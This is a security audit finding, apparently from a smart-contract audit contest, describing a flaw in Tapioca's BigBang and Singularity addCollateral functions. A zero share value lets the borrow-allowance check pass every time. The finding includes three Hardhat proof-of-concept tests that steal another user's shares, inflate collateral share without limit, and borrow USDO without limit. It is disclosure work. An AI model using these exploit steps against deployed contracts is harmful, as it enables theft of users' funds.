[H-05]  Ability to steal user funds and increase collateral share infinitely in BigBang and Singularity
Submitted byAck, also found by Koolex (1,2),RedOneN,plainshift,ladboy233,bin2chen,zzzitron,ayeslick,KIntern_NA,kaden,xuwinnie,Oxsadeeq,0xStalin,0xG0P1,ltyu,cergyk,TiesStevelink,rvierdiiev, and0xRobocop
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L288
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLCollateral.sol#L27
TheaddCollateralmethods in both BigBang and Singularity contracts allow the share parameter to be passed as0. Whenshareis0, the equivalent amount of shares is calculated using the YieldBoxtoSharemethod. However, there is a modifier namedallowedBorrowthat is intended to check the allowed borrowing amount for each implementation of theaddCollateralmethods. Unfortunately, the modifier is called with thesharevalue passed toaddCollateral, and in the case of0, it will always pass.
// MarketERC20.solfunction_allowedBorrow(addressfrom,uintshare)internal{if(from!=msg.sender) {if(allowanceBorrow[from][msg.sender] <share) {revertNotApproved(from,msg.sender);}allowanceBorrow[from][msg.sender] -=share;}}// BigBang.solfunctionaddCollateral(addressfrom,addressto,boolskim,uint256amount,uint256share// @audit share is calculated afterwords the modifier)publicallowedBorrow(from,share)notPaused{_addCollateral(from,to,skim,amount,share);}function_addCollateral(addressfrom,addressto,boolskim,uint256amount,uint256share)internal{if(share==0) {share=yieldBox.toShare(collateralId,amount,false);}userCollateralShare[to] +=share;uint256oldTotalCollateralShare=totalCollateralShare;totalCollateralShare=oldTotalCollateralShare+share;_addTokens(from,to,collateralId,share,oldTotalCollateralShare,skim);emitLogAddCollateral(skim?address(yieldBox) :from,to,share);}
This leads to various critical scenarios in BigBang and Singularity markets where user assets can be stolen, and collateral share can be increased infinitely which in turn leads to infinite USDO borrow/mint and borrowing max assets from Singularity market.
Refer toProof of Conceptfor attack examples
Impact
High - allows stealing of arbitrary user yieldbox shares in BigBang contract and Singularity. In the case of BigBang this leads to infinite minting of USDO. Effectively draining all markets and LPs where USDO has value. In the case of Singularity this leads to infinite borrowing, allowing an attacker to obtain possession of all other usersâ€™ collateral in Singularity.
Proof of concept
Malicious actor can add any user shares that were approved to BigBang or Singularity contracts deployed. This way adversary is stealing user shares that he can unwrap to get underlying collateral provided.
it('allows steal other user YieldBox collateral shares',async()=>{const{wethBigBangMarket,weth,wethAssetId,yieldBox,deployer:userA,eoa1:userB,} =awaitloadFixture(register);awaitweth.approve(yieldBox.address,ethers.constants.MaxUint256);awaityieldBox.setApprovalForAll(wethBigBangMarket.address,true);constwethMintVal=ethers.BigNumber.from((1e18).toString()).mul(10,);awaitweth.freeMint(wethMintVal);constvalShare=awaityieldBox.toShare(wethAssetId,wethMintVal,false,);// User A deposit assets to yieldbox, receives sharesawaityieldBox.depositAsset(wethAssetId,userA.address,userA.address,0,valShare,);letuserABalance=awaityieldBox.balanceOf(userA.address,wethAssetId,)expect(userABalance.gt(0)).to.be.true;expect(userABalance.eq(valShare)).to.be.true;// User B adds collateral to big bang from user A sharesawaitexpect(wethBigBangMarket.connect(userB).addCollateral(userA.address,userB.address,false,wethMintVal,0,)).to.emit(yieldBox,"TransferSingle").withArgs(wethBigBangMarket.address,userA.address,wethBigBangMarket.address,wethAssetId,valShare);userABalance=awaityieldBox.balanceOf(userA.address,wethAssetId,)expect(userABalance.eq(0)).to.be.true;letcollateralShares=awaitwethBigBangMarket.userCollateralShare(userB.address,);expect(collateralShares.gt(0)).to.be.true;expect(collateralShares.eq(valShare)).to.be.true;// User B removes collateralawaitwethBigBangMarket.connect(userB).removeCollateral(userB.address,userB.address,collateralShares,);collateralShares=awaitwethBigBangMarket.connect(userB).userCollateralShare(userA.address,);expect(collateralShares.eq(0)).to.be.true;// User B ends up with User A shares in yieldboxletuserBBalance=awaityieldBox.balanceOf(userB.address,wethAssetId,)expect(userBBalance.gt(0)).to.be.true;expect(userBBalance.eq(valShare)).to.be.true;});
For Singularity contract this allows to increase collateralShare by the amount of assets provided as collateral infinitely leading tox / x + 1share of the collateral for the caller with no shares in the pool, where x is the number of times  theaddColateralis called, effectively allowing for infinite borrowing. As a consequence, the attacker can continuously increase their share of the collateral without limits, leading to potentially excessive borrowing of assets from the Singularity market.
it('allows to infinitely increase user collateral share in BigBang',async()=>{const{wethBigBangMarket,weth,wethAssetId,yieldBox,deployer:userA,eoa1:userB,} =awaitloadFixture(register);awaitweth.approve(yieldBox.address,ethers.constants.MaxUint256);awaityieldBox.setApprovalForAll(wethBigBangMarket.address,true);constwethMintVal=ethers.BigNumber.from((1e18).toString()).mul(10,);awaitweth.freeMint(wethMintVal);constvalShare=awaityieldBox.toShare(wethAssetId,wethMintVal,false,);// User A deposit assets to yieldbox, receives sharesawaityieldBox.depositAsset(wethAssetId,userA.address,userA.address,0,valShare,);letuserABalance=awaityieldBox.balanceOf(userA.address,wethAssetId,)expect(userABalance.gt(0)).to.be.true;expect(userABalance.eq(valShare)).to.be.true;// User A adds collateral to BigBangawaitwethBigBangMarket.addCollateral(userA.address,userA.address,false,wethMintVal,0,);letbigBangBalance=awaityieldBox.balanceOf(wethBigBangMarket.address,wethAssetId,)expect(bigBangBalance.eq(valShare)).to.be.true;letuserACollateralShare=awaitwethBigBangMarket.userCollateralShare(userA.address,);expect(userACollateralShare.gt(0)).to.be.true;expect(userACollateralShare.eq(valShare)).to.be.true;letuserBCollateralShare=awaitwethBigBangMarket.userCollateralShare(userB.address,);expect(userBCollateralShare.eq(0)).to.be.true;// User B is able to increase his share to 50% of the whole collateral addedawaitexpect(wethBigBangMarket.connect(userB).addCollateral(wethBigBangMarket.address,userB.address,false,wethMintVal,0,)).to.emit(yieldBox,"TransferSingle")userBCollateralShare=awaitwethBigBangMarket.userCollateralShare(userB.address,);expect(userBCollateralShare.gt(0)).to.be.true;expect(userBCollateralShare.eq(valShare)).to.be.true;// User B is able to increase his share to 66% of the whole collateral addedawaitexpect(wethBigBangMarket.connect(userB).addCollateral(wethBigBangMarket.address,userB.address,false,wethMintVal,0,)).to.emit(yieldBox,"TransferSingle")userBCollateralShare=awaitwethBigBangMarket.userCollateralShare(userB.address,);expect(userBCollateralShare.gt(0)).to.be.true;expect(userBCollateralShare.eq(valShare.mul(2))).to.be.true;// ....});
In the BigBang contract, this vulnerability allows a user to infinitely increase their collateral shares by providing collateral repeatedly. As a result, the user can artificially inflate their collateral shares provided, potentially leading to an excessive borrowing capacity. By continuously adding collateral without limitations, the user can effectively borrow against any collateral amount they desire, which poses a significant risk to USDO market.
it('allows infinite borrow of USDO',async()=>{const{wethBigBangMarket,weth,wethAssetId,yieldBox,deployer:userA,eoa1:userB,} =awaitloadFixture(register);awaitweth.approve(yieldBox.address,ethers.constants.MaxUint256);awaityieldBox.setApprovalForAll(wethBigBangMarket.address,true);constwethMintVal=ethers.BigNumber.from((1e18).toString()).mul(10,);awaitweth.freeMint(wethMintVal);constvalShare=awaityieldBox.toShare(wethAssetId,wethMintVal,false,);// User A deposit assets to yieldbox, receives sharesawaityieldBox.depositAsset(wethAssetId,userA.address,userA.address,0,valShare,);letuserABalance=awaityieldBox.balanceOf(userA.address,wethAssetId,)expect(userABalance.gt(0)).to.be.true;expect(userABalance.eq(valShare)).to.be.true;// User A adds collateral to BigBangawaitwethBigBangMarket.addCollateral(userA.address,userA.address,false,wethMintVal,0,);letbigBangBalance=awaityieldBox.balanceOf(wethBigBangMarket.address,wethAssetId,)expect(bigBangBalance.eq(valShare)).to.be.true;letuserACollateralShare=awaitwethBigBangMarket.userCollateralShare(userA.address,);expect(userACollateralShare.gt(0)).to.be.true;expect(userACollateralShare.eq(valShare)).to.be.true;awaitwethBigBangMarket.borrow(userA.address,userA.address,"7450000000000000000000");awaitexpect(wethBigBangMarket.borrow(userA.address,userA.address,"7450000000000000000000")).to.be.reverted;awaitexpect(wethBigBangMarket.addCollateral(wethBigBangMarket.address,userA.address,false,wethMintVal,0,)).to.emit(yieldBox,"TransferSingle")awaitwethBigBangMarket.borrow(userA.address,userA.address,"7500000000000000000000");awaitexpect(wethBigBangMarket.addCollateral(wethBigBangMarket.address,userA.address,false,wethMintVal,0,)).to.emit(yieldBox,"TransferSingle")awaitwethBigBangMarket.borrow(userA.address,userA.address,"7530000000000000000000");// ....});
Recommended Mitigation Steps
Check allowed to borrow shares amount after evaluating equivalent them
0xRektora (Tapioca) confirmed via duplicate issue 55